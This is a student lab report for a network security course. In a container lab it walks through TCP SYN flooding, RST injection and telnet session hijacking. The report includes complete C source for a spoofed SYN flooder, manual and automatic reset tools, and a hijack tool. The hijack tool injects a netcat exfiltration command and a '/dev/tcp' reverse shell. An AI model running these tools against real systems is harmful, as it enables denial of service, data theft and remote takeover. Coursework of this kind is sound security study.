
#import "@preview/quill-assignment:0.1.0": *

#show: assignment.with(
  title: "TCP Attacks",
  subtitle: "Exploring Synflooding, Reset and Session Hijacking Attacks",
  course: "UE24CS343AB6: Computer Network Security",
  assignment: "Assignment 4",
  student: "Sumedh Girish",
  // student-id: "PES1UG24CS480",
  instructor: "Dr. Preet Kanwal",
  department: "Department of Computer Science and Engineering",
  university: "PES University",
  date: datetime.today(),
  theme: "nord-light",
  cover-page: true,
  cover-style: "swiss",
  doc-ref: "QUILL-ASSIGN",
  rev: "1.6",
  scale: "N.T.S.",
)

#show link: set text(fill: blue, weight: "bold")

= Syn-Flooding Attack

The objective of this task is to understand and implement code to perform TCP
synflooding attacks. The attack works by continuously overflowing or *flooding*
the TCP queue for *half-open connections*. If the implementation for accepting
connections does use such a queue, it becomes possible for a malicious threat
actor to perform DoS attack on the system and compromise its availability.

The primary constraint and main goal is thus to quickly generate large amount
of packets from random sources to a target endpoint. By doing so the attacker
overwhelms the target and overflows its queue making it unable to even accept
valid connections.

We begin by setting up the environment.

1. On the attacker machine, check the size of the backlog queue, and *disable
  syn-cookies*, which acts like a countermeasure to the attack.
2. Check the system for currently established connections and thier status. We
  do not expect to see many half-open connections(none in the ideal scenario).
  This is done using `netstat -tna`. This will be demonstrated again later after
  attack is performed.

#figure(
  image("assets/20260828204950.png"),
  caption: [Step 1: Checking queue size and disabling syn cookies],
)

Then we can begin to write the code. To have ease with handling packets, I
create the following macros.

```c
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET(Name, Header_T)   \
	typedef struct {             \
		Header_T header;         \
		u_char data[];           \
	} __attribute__((packed)) Name

PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);
```

This makes so that the packet for the next OSI Layer becomes the `data` field
of the previous layer header.

Then we create the syn packet. This is a relatively straightforward process
of filling out values in the appropriate fields.

```c
u_char packet_buffer[4096] = {0};


void send_syn_packets(const char *target_ip, u_short target_port) {
    ...

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();
	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.daddr = sin.sin_addr.s_addr;


	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_SYN;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;
    ...
}
```

We also initalise the functions and pseudo headers required to verify the TCP
packet.

```c
unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}
```

The above code computes the checksum.

```c
typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char tcp_psuedo_buff[4046] = {0};

void send_syn_packets(const char *target_ip, u_short target_port) {
    ...
	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);
    ...
}
```

Then we create the socket to send the packet over to the target.

```c
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
```

The main loop containing the logic to send the packets quickly is thus a `while`
loop as stated below which randomly geneted source ip and port and ships the packet.

```c
	while (1) {
		ip_pkt->header.saddr = arc4random();
		tcp_pkt->header.source = arc4random();
		tcp_pkt->header.seq = htonl(arc4random());

		tcp_chksum_buff->src_addr = ip_pkt->header.saddr;

		ip_pkt->header.check = 0;
		tcp_pkt->header.check = 0;

		ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

		memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

		tcp_pkt->header.check = in_checksum((u_short *)tcp_psuedo_buff,
											sizeof(psh_t) + sizeof(tcp_t));

		sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
			   sizeof(sin));
	}
```

The entire code can thus be written as follows. You may jump to #link(<synflood_results>)[the output section]
to view the results of running this code.

```c
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET(Name, Header_T)    \
	typedef struct {              \
		Header_T header;          \
		u_char data[];            \
	} Name

PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char packet_buffer[4096] = {0};
u_char tcp_psuedo_buff[4046] = {0};

void send_syn_packets(const char *target_ip, u_short target_port) {
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();

	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(target_port);
	sin.sin_addr.s_addr = inet_addr(target_ip);

	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.daddr = sin.sin_addr.s_addr;

	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_SYN;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;

	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);

	while (1) {
		ip_pkt->header.saddr = arc4random();
		tcp_pkt->header.source = arc4random();
		tcp_pkt->header.seq = htonl(arc4random());

		tcp_chksum_buff->src_addr = ip_pkt->header.saddr;

		ip_pkt->header.check = 0;
		tcp_pkt->header.check = 0;

		ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

		memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

		tcp_pkt->header.check = in_checksum((u_short *)tcp_psuedo_buff,
											sizeof(psh_t) + sizeof(tcp_t));

		sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
			   sizeof(sin));
	}

	close(sock);
}

int main() {
	const char target_ip[] = "10.9.0.5";
	u_short target_port = 23;
	printf("Starting SYN flood to %s:%hu\n", target_ip, target_port);

	send_syn_packets(target_ip, target_port);
}
```

= Demonstration and Results <synflood_results>

To perform the attack, first compile the code on the host machine using the
following command.

```bash
gcc -o synflood synflood.c -lpcap -lbsd
```

Then inside the attacker container run the script and wait for a few seconds.

#figure(
  image("assets/20260829072708.png"),
  caption: "Running the synflood exploit",
)

Now on the victim machine, you should see that `netstat -tna` shows a queue
that is flooded with half open connections from random ips.

#figure(
  image("assets/20260829072717.png"),
  caption: "Flooded queue after attack",
)

Trying to  telnet into the victim machine at this point should time out after a
few minutes. *It is important to keep the program running for the entire
duration of the attack for this to work*.

#figure(
  image("assets/20260828211607.png"),
  caption: "User unable to connect to overwhelm machine.",
)

#pagebreak()

= TCP Reset Attacks

Next we move onto TCP reset attacks. Unlike the previous attack, this attack
*does not require a queue*. It intead works by trying to pretend to be part
of another TCP session that it should not able to access and shuts it down
unilaterally.

This is done using the TCP reset flag to abruptly terminate a valid active
connection between 2 hosts. To do this, we will need to fix the mess from the
earlier attack.

We do this by stopping the attacker exploit, then flushing the queue. Then we
turn syncookies back on for good measure.

#figure(
  image("assets/20260829072921.png"),
  caption: "Flushing TCP queue and showing corrected status",
)

#figure(
  image("assets/20260829071903.png"),
  caption: "Enabling SYN Cookies",
)

Then we begin writing the code for the exploit. *This is 80% similar to the
previously written code*. The only major change is to use the source addresses
sniffed from the packet and set the `RST` bit instead of the `SYN` bit.

Thus, we do not re explain all the parts and present the code below. You may
jump to the #link(<results_reset>)[output section] to view the results.

```c
#include <assert.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET(Name, Header_T)                                                 \
	typedef struct {                                                           \
		Header_T header;                                                       \
		u_char data[];                                                         \
	} Name

PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char packet_buffer[4096] = {0};
u_char tcp_psuedo_buff[4046] = {0};

void send_reset_packet(const char *target_ip, u_short target_port,
					   const char *source_ip, u_short source_port,
					   u_long seq_number) {
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();

	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(target_port);
	sin.sin_addr.s_addr = inet_addr(target_ip);

	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.saddr = inet_addr(source_ip);
	ip_pkt->header.daddr = sin.sin_addr.s_addr;

	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.source = htons(source_port);
	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.seq = htonl(seq_number);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_RST;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;

	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);

	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_pkt->header.check =
		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));

	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
		   sizeof(sin));

	close(sock);
}

const char *print_usage() {
	printf("Did not recieve enough arguments!");
	exit(1);

	return NULL;
}

#define shift(buff, len) ((len-- > 0) ? (*buff++) : (print_usage()))

int main(int argc, const char **argv) {
	// Shift out the program name
	const char *program_name = shift(argv, argc);

	const char *target_ip, *source_ip;
	u_short target_port, source_port;
	u_long seq_number;

	target_ip = shift(argv, argc);
	sscanf(shift(argv, argc), "%hu", &target_port);

	source_ip = shift(argv, argc);
	sscanf(shift(argv, argc), "%hu", &source_port);

	sscanf(shift(argv, argc), "%lu", &seq_number);

	printf("Trying reset attack on connection specified by (target=%s:%hu, "
		   "source=%s:%hu) with seq number %lu\n",
		   target_ip, target_port, source_ip, source_port, seq_number);

	send_reset_packet(target_ip, target_port, source_ip, source_port,
					  seq_number);

	printf("Done.\n");
}
```

#pagebreak()

= Demonstration and Results <results_reset>

To run the code we must first have an established conneection between the
target and the user machines. We can establish a telnet connection between the
two machines by entering the containers and running the following command in
the user system.

```bash
telnet 10.9.0.5
```

This should prompt to login using *victim* credentials.

#figure(
  image("assets/20260829072812.png"),
  caption: "Telnet into victom from user container",
)

Then we proceed with the the attack. Open wireshark and identify the last TCP
packet send in the connection used by the telnet instance. To do this filter
packets by the TCP port with `tcp.port == 23` and search for the last entry.
We are going to look for the *sequence number that the server expects from the
client* to shut down the connection.


#figure(
  image("assets/20260829073200.png"),
  caption: "Filter packets in wireshark",
)

#figure(
  image("assets/20260829073302.png"),
  caption: "Find final packet from client to server",
)

Now enter the extracted values as arguments to the code to perform the exploit.

#figure(
  image("assets/20260829073432.png"),
  caption: "Performing the exploit from attacker",
)

You should see a reset packet appear in wireshark and the telnet connection
close from server end on client side.

#figure(
  image("assets/20260829073454.png"),
  caption: "Reset packet showing up in wireshark",
)

#figure(
  image("assets/20260829073536.png"),
  caption: "Connection termination on user end from server",
)

This can be done *automatically* in code by combining pcap sniffing to ascertain
the values required to perform resets.

We provide the code and outputs for that below in the same manner.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap/pcap.h>

#define PACKET(Name, Header_T)                                                 \
	typedef struct {                                                           \
		Header_T header;                                                       \
		u_char data[];                                                         \
	} Name

PACKET(eth_t, struct ether_header);
PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char packet_buffer[4096] = {0};
u_char tcp_psuedo_buff[4046] = {0};

void send_reset_packet(const char *target_ip, u_short target_port,
					   const char *source_ip, u_short source_port,
					   u_long seq_number) {
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();

	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(target_port);
	sin.sin_addr.s_addr = inet_addr(target_ip);

	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.saddr = inet_addr(source_ip);
	ip_pkt->header.daddr = sin.sin_addr.s_addr;

	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.source = htons(source_port);
	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.seq = htonl(seq_number);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_RST;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;

	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);

	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_pkt->header.check =
		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));

	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
		   sizeof(sin));

	close(sock);
}

void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
			   const u_char *packet) {
	eth_t *link_pkt = (eth_t *)packet;

	if (ntohs(link_pkt->header.ether_type) == ETHERTYPE_IP) {
		ip_t *ip_pkt = (ip_t *)link_pkt->data;

		char src_ip[INET_ADDRSTRLEN];
		char dst_ip[INET_ADDRSTRLEN];

		inet_ntop(AF_INET, &ip_pkt->header.saddr, src_ip, INET_ADDRSTRLEN);
		inet_ntop(AF_INET, &ip_pkt->header.daddr, dst_ip, INET_ADDRSTRLEN);
		struct protoent *proto = getprotobynumber(ip_pkt->header.protocol);

		if (ip_pkt->header.protocol == IPPROTO_TCP) {
			tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

			u_short src_port = ntohs(tcp_pkt->header.source);
			u_short dst_port = ntohs(tcp_pkt->header.dest);
			u_long seq = ntohl(tcp_pkt->header.ack_seq);

			printf("Reset (src=%s:%hu, dst=%s:%hu) with sequence number %lu\n",
				   src_ip, src_port, dst_ip, dst_port, seq);

			send_reset_packet(src_ip, src_port, dst_ip, dst_port, seq);
		}
	}
}

#define LOG_ON_ERROR(exp, handle)                                              \
	if (exp != 0) {                                                            \
		pcap_perror(handle, "Error: ");                                        \
		exit(EXIT_FAILURE);                                                    \
	}

void apply_filter(pcap_t *handle, char *filter_exp) {
	struct bpf_program fp;
	bpf_u_int32 net;

	pcap_compile(handle, &fp, filter_exp, 1, net);
	LOG_ON_ERROR(pcap_setfilter(handle, &fp), handle);
}

char *find_bridge_interface(pcap_if_t *alldevsp) {
	pcap_if_t *current = alldevsp;

	while (current != NULL) {
		if (current->name != NULL) {
			if (strncmp(current->name, "br-", 3) == 0) {
				return current->name;
			}
		}
		current = current->next;
	}

	return NULL;
}

int main() {
	pcap_if_t *alldevsp = NULL;
	char err_buff[PCAP_ERRBUF_SIZE] = {0};

	pcap_findalldevs(&alldevsp, err_buff);
	char *bridge_iface = find_bridge_interface(alldevsp);

	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
	apply_filter(handle, "tcp src port 23");

	printf("Running on interface %s\n", bridge_iface);

	pcap_loop(handle, -1, sniff_tcp, NULL);

	pcap_close(handle);
}
```

The code now auto detects all tcp packets to a Telnet server and resets it.

#figure(
  image("assets/20260829100341.png"),
  caption: "Auto sniffing telnet packets and performing reset",
)

Then if the user *presses even single character* the connection is immediately
reset and broken beyond repair.

#figure(
  image("assets/20260829100421.png"),
  caption: "Auto reset in action against telnet connection",
)

#figure(
  image("assets/20260829100414.png"),
  caption: "Connection reset screen on user machine",
)

#pagebreak()

= Session Hijacking and Reverse Shells

Both of these exploits build on the previous knowledge of impersonating a user
on a TCP connection, with the exception that the attack *also changes and controls
the payload sent to the server*.

The conditions to do the attack are thus very similar to before except for a few
changes.

1. The attacker now maintains 2 instances, one to perform the attack, another to
  listen to reply.
2. The user looses access to the endpoint due to *TCP desynchronisation* instead
  of intentional packet spoofing.

Here we are going to add a data section to the TCP payload instead of only
changing the flag bits in the TCP packet. The below code indicates the changed
sections from before.

```c
void send_modified_packet(u_char *pkt_buf, const char *cmd) {
	eth_t *eth = (eth_t *)pkt_buf;
	if (ntohs(eth->header.ether_type) != ETHERTYPE_IP) {
		printf("Something wrong with packet at ethernet layer\n");
		return;
	}

	ip_t *ip = (ip_t *)eth->data;
	if (ip->header.protocol != IPPROTO_TCP) {
		printf("Not a TCP packet.\n");
		return;
	}

	tcp_t *tcp = (tcp_t *)ip->data;

	u_char *payload_ptr = (u_char *)tcp + tcp->header.doff * 4;
	u_int cmd_len = strlen(cmd) * 2;

	memcpy(payload_ptr, cmd, cmd_len);

	int total_ip_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
	ip->header.tot_len = htons(total_ip_len);

	ip->header.check = 0;
	ip->header.check = in_checksum((unsigned short *)ip, sizeof(ip_t));

	tcp->header.check = 0;
	int tcp_segment_len = sizeof(tcp_t) + cmd_len;

	psh_t psh;
	psh.src_addr = ip->header.saddr;
	psh.dst_addr = ip->header.daddr;
	psh._placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_len = htons(tcp_segment_len);

	u_char pseudo_buff[4096];
	memcpy(pseudo_buff, &psh, sizeof(psh_t));
	memcpy(pseudo_buff + sizeof(psh_t), tcp, tcp_segment_len);

	tcp->header.check = in_checksum((unsigned short *)pseudo_buff,
									sizeof(psh_t) + tcp_segment_len);

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		perror("Socket creation failed");
		return;
	}

	int one = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = tcp->header.dest;
	sin.sin_addr.s_addr = ip->header.daddr;

	char src_ip[INET_ADDRSTRLEN];
	char dst_ip[INET_ADDRSTRLEN];

	inet_ntop(AF_INET, &ip->header.saddr, src_ip, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, &ip->header.daddr, dst_ip, INET_ADDRSTRLEN);

	u_short src_port = ntohs(tcp->header.source);
	u_short dst_port = ntohs(tcp->header.dest);

	printf("Hijacking TCP session (src=%s:%hu dst=%s:%hu) with seq: %u\n",
		   src_ip, src_port, dst_ip, dst_port, ntohl(tcp->header.seq));

	sendto(sock, ip, total_ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));

	close(sock);
}

void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
			   const u_char *packet) {
	const char *command = "\r cat /secret | nc 10.9.0.1 9090 \r\n";

	u_char *pkt_copy = malloc(header->caplen + strlen(command));
	if (pkt_copy) {
		memcpy(pkt_copy, packet, header->caplen);
	}

	send_modified_packet(pkt_copy, command);

	free(pkt_copy);
}
```

#pagebreak()

= Results and Outputs

In the following section we try to extract a secret file from the victim
machine by hijacking the user's valid telnet session.

We begin by creating the secret file in the root directory as follows. *Note
that this is on the victim machine* after the user establishes a telnet
connection.

#figure(
  image("assets/20260829122417.png"),
  caption: "Creating the secret file",
)

Then on the attacker start a netcat listener where the output of the payload
will be sent.

#figure(
  image("assets/20260829134429.png"),
  caption: "Netcat listener on attacker machine",
)

Finally run the hijack script and wait for new tcp packet to be sent over the
connection.

#figure(
  image("assets/20260829134442.png"),
  caption: "Attacker waiting for TCP packet",
)

#figure(
  image("assets/20260829134454.png"),
  caption: "Attacker after hijacking is complete",
)

Check the listener for the secret file contents!

#figure(
  image("assets/20260829140930.png"),
  caption: "Contents of the secret file after session hijack",
)

The *reverse shell* uses the exact same mechanic but with a slightly more
clever command to execute.

```c
const char *command = "\r bash -i >& /dev/tcp/10.9.0.1/9090 0>&1 \r\n";
```

This connects the netcat session IO file descriptors to the nc listener allowing
the attacker to persist in the system and execute *ANY NUMBER OF COMMANDS*.

This is shown below.

#figure(
  image("assets/20260829141657.png"),
  caption: "Running hijack with reverse shell command",
)

#figure(
  image("assets/20260829141727.png"),
  caption: "Using the reverse shell to compromise system on netcat listener",
)
